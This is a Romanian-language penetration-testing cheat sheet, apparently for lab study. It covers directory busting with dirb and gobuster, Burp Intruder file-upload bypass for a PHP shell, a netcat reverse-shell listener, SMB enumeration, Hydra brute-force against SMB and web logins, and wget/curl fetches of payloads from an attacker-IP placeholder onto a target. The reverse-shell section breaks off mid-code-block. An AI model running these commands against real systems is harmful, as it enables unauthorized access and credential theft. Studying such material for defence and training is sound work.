# Cybersecurity & Web Reconnaissance Tools

Ghiduri de referință, comenzi rapide și metodologii de scanare/investigație folosite în evaluarea securității sistemelor și a aplicațiilor web.

---

## 1. Utilitarul `dirb` (Directory & Content Busting)

`dirb` este un scanner de securitate web bazat pe dicționare (*wordlists*). Acesta trimite automat cereri HTTP GET către un server țintă pentru a identifica directoare ascunse, pagini de administrare și fișiere sensibile nespecificate public.

### Sintaxă de Bază
```bash
dirb http://<IP_SAU_DOMENIU>/
```

Exemplu simplu:
```bash
dirb [http://10.10.10.10/](http://10.10.10.10/)
```

---

### Opțiuni și Flag-uri Frecvente

* **Scanare cu un dicționar specific (Wordlist custom):**
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) /usr/share/wordlists/dirb/big.txt
  ```

* **Căutare după extensii specifice de fișiere (`-X`):**
  Adaugă extensiile la fiecare termen testat (esențial pentru scripturi și backup-uri):
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -X .php,.txt,.html,.bak
  ```

* **Ignorarea anumitor coduri de răspuns HTTP (`-N`):**
  Ascunde codurile de eroare care poluează ecranul:
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -N 403
  ```

* **Salvarea rezultatelor într-un fișier text (`-o`):**
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -o scan_results.txt
  ```

* **Scanare non-interactivă / Silent (`-w`):**
  Nu oprește scanarea la avertismente generice ale serverului:
  ```bash
  dirb [http://10.10.10.10/](http://10.10.10.10/) -w
  ```

---

## 2. Gobuster

Utilitar rapid scris în Go pentru brute-forcing pe componente web (directoare, fișiere, subdomenii, vhosts). Mult mai rapid decât `dirb` datorită execuției concurente (goroutines).

### Sintaxă de bază (Directory Enumeration)
```bash
gobuster dir -u <URL> -w <WORDLIST>
```
---

### Gobuster Flags

| Flag | Descriere | Exemplu |
| :--- | :--- | :--- |
| `dir` | Modul de căutare directoare și fișiere web | `gobuster dir` |
| `-u` | URL-ul complet al țintei (protocol + host + port) | `-u http://10.10.x.x:3333` |
| `-w` | Calea către fișierul de tip wordlist | `-w /usr/share/wordlists/dirb/common.txt` |
| `-x` | Extensii de fișiere căutate (separate prin virgulă) | `-x php,html,txt` |
| `-t` | Număr de thread-uri concurente (viteză, default: 10) | `-t 50` |
| `-e` | Afișează URL-ul complet în terminal | `-e` |
| `-k` | Ignoră verificarea certificatelor SSL (HTTPS invalid) | `-k` |
| `-o` | Salvează rezultatele într-un fișier text | `-o scan_results.txt` |
| `-s` | Coduri de status HTTP acceptate (whitelist) | `-s "200,204,301,302,307"` |
| `-b` | Coduri de status HTTP ignorate (blacklist) | `-b "403,404"` |
| `-U` | Username pentru HTTP Basic Authentication | `-U admin` |
| `-P` | Parolă pentru HTTP Basic Authentication | `-P secret123` |
| `-c` | Cookie transmis în header-ul fiecărui request | `-c "PHPSESSID=xyz123"` |
| `-p` | Proxy prin care rutezi cererile (ex: Burp Suite) | `-p http://127.0.0.1:8080` |
| `-z` | Nu afișează bara de progres (reduce output-ul) | `-z` |

---


## 3. BurpSuite

Platformă integrată pentru testarea securității aplicațiilor web. Funcționează ca un proxy HTTP/HTTPS de tip Man-in-the-Middle (MitM) între browser și serverul țintă, permițând interceptarea, inspectarea, modificarea și automatizarea cererilor.

### Module principale

| Modul | Rol principal | Scenariu de utilizare |
| :--- | :--- | :--- |
| **Proxy** | Interceptează traficul HTTP/HTTPS în timp real | Modificarea parametrilor din formulare, headere, cookie-uri înainte de a ajunge pe server |
| **Repeater** | Retrimite cereri individuale modificate manual | Testare rapidă pentru SQLi, XSS, bypass-uri de logare fără a reîncărca pagina în browser |
| **Intruder** | Automatizează atacuri personalizate și fuzzing | Brute-force pe parole/directoare, testare de extensii de fișiere (file upload bypass), IDOR |
| **Target** | Maparea structurii site-ului (Site Map) | Vizualizarea arborelui complet de endpoint-uri, directoare și parametri descoperiți |
| **Decoder** | Encodare/decodare rapidă de date | URL encoding, Base64, Hex, HTML entities direct în GUI |

---

### Tipuri de atac în Intruder

* **Sniper:** Folosește un singur set de payload-uri. Dacă sunt marcate mai multe poziții (`§...§`), le testează pe rând, pe fiecare poziție independent.
* **Battering Ram:** Folosește un singur set de payload-uri, dar inserează **aceeași valoare** în toate pozițiile marcate simultan la fiecare request.
* **Pitchfork:** Folosește seturi diferite de payload-uri pentru fiecare poziție, iterând prin liste în paralel (linie cu linie: payload1 din lista A cu payload1 din lista B).
* **Cluster Bomb:** Folosește seturi diferite de payload-uri pentru fiecare poziție și testează **toate permutările posibile** (produs cartezian, ideal pentru username + password brute-force).

---

### Workflow rapid: File Upload Extension Bypass (Intruder)

1. **Setare Proxy:** În browser (Firefox în Kali), navighează prin proxy (`127.0.0.1:8080` sau extensia FoxyProxy).
2. **Interceptare:** În Burp $\rightarrow$ tab-ul **Proxy** $\rightarrow$ asigură-te că butonul arată `Intercept is on`.
3. **Upload de test:** Încarcă un fișier din browser. În Burp va apărea cererea `POST /cale/upload`.
4. **Trimitere la Intruder:** Click dreapta în cerere $\rightarrow$ **Send to Intruder** (sau `Ctrl + I`).
5. **Setare poziție (Tab-ul Positions):**
   * Selectează modul de atac: **Sniper**.
   * Apasă butonul **Clear §**.
   * Evidențiază doar extensia fișierului în header-ul cererii (ex: `filename="shell§.php§"`) și apasă **Add §**.
6. **Setare payload (Tab-ul Payloads):**
   * Payload type: **Simple list**.
   * Încarcă un dicționar cu extensii (ex: `.php`, `.php3`, `.php4`, `.php5`, `.phtml`).
7. **Execuție și analiză:**
   * Apasă **Start Attack**.
   * Sortează rezultatele după coloana **Length** sau **Status** pentru a identifica răspunsurile care deviază de la eroarea clasică (indică acceptarea fișierului pe server).

---

## 4. Reverse Shell

Tehnică prin care o mașină țintă compromisă inițiază o conexiune de rețea ieșită (outbound) înapoi către mașina atacatorului, oferindu-i acestuia o linie de comandă interactivă (shell).

### Reverse Shell vs. Bind Shell

| Tip Shell | Cine ascultă (Listener) | Cine inițiază conexiunea | Avantaj / Caz de utilizare |
| :--- | :--- | :--- | :--- |
| **Reverse Shell** | Atacatorul (`nc -lvnp <port>`) | Ținta (prin payload/script) | Trece ușor de firewall-urile țintei (traficul outbound este de obicei permis) |
| **Bind Shell** | Ținta deschide un port local | Atacatorul se conectează la IP-ul țintei | Util dacă atacatorul nu are IP rutabil direct sau dacă conexiunile outbound sunt blocate strict |

---

### Componentele unui Reverse Shell

1. **Listener-ul (pe mașina ta - Kali):**
   Un utilitar de rețea (de regulă `netcat`) configurat să aștepte pasiv conexiunea:
   ```bash
   nc -lvnp 1234

---


## 🔍 5. Enumerare Servicii de Rețea

### enum4linux
Utilizat pentru scanarea și enumerarea detaliată a serviciilor **SMB/Samba** (porturile 139/445) pe sisteme Windows și Linux. Este ideal pentru extragerea numelor de utilizatori și a mapelor partajate.

* **Comandă completă (cu salvare în log):**
  ```bash
  /opt/enum4linux/enum4linux.pl -a <IP_TINTA> | tee enum4linux.log
  ```
* **Opțiuni cheie:**
  * `-a` (All): Rulează toate testele de enumerare posibile (utilizatori, grupuri, share-uri, politici).
  * `| tee <fișier>`: Afișează rezultatul în terminal și îl salvează simultan într-un fișier text pentru analiză ulterioară.

---

## 💣 6. Atacuri prin Forță Brută (Brute Forcing)

### Hydra
Unul dintre cele mai rapide și flexibile instrumente pentru spargerea credențialelor (username/parolă) pe diverse protocoale (SSH, SMB, FTP, HTTP Form).

* **Atac pe serviciul SMB (Rețea):**
  Dacă ai aflat un username din `enum4linux`, folosește:
  ```bash
  hydra -l <username> -P /usr/share/wordlists/rockyou.txt <IP_TINTA> smb
  ```

* **Atac pe formulare Web (HTTP-POST):**
  ```bash
  hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_TINTA> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid username" -V
  ```
* **Opțiuni cheie:**
  * `-l` / `-L`: Transmite un singur utilizator (litera mică) sau o listă de utilizatori dintr-un fișier (litera mare).
  * `-p` / `-P`: Transmite o singură parolă (litera mică) sau o listă de parole / wordlist (litera mare).
  * `-V` (Verbose): Afișează în timp real fiecare combinație testată.

---

## 📦 7. Transfer de Fișiere în Laborator

### Python HTTP Server (Sursa)
Cea mai rapidă metodă de a transforma mașina de atac într-un server web temporar pentru a livra scripturi sau payload-uri.
```bash
python3 -m http.server 8000
```

### Metode de descărcare pe mașina țintă
* **Cu Wget:** `wget http://<IP_ATACATOR>:8000/fisier.ext`
* **Cu Curl:** `curl http://<IP_ATACATOR>:8000/fisier.ext -o fisier.ext`

### SCP (Secure Copy) cu suport Legacy
Folosit pentru a copia directoare întregi prin SSH, forțând algoritmi vechi dacă serverul de laborator este învechit:
```bash
scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa -r user@<IP_TINTA>:/cale/server /cale/local/
```

---

## 🤖 8. Scripturi de Enumerare Automată (Post-Exploatare)

Aceste unelte sunt colecții de comenzi Bash automate care auditează sistemul local pentru a găsi vectori de Privilege Escalation.

* **`linpeas.sh`**: Cel mai avansat script; caută configurări greșite generalizate. Textul **roșu pe fundal galben** indică o vulnerabilitate aproape sigură.
* **`lse.sh` (Linux Smart Enumeration)**: Filtrează rezultatele în funcție de nivelul de detalii dorit (opțiunea `-l 0` arată doar erorile critice).
* **`LinEnum.sh`**: Unealtă clasică și foarte stabilă pentru un sumar curat al drepturilor Sudo și SUID.

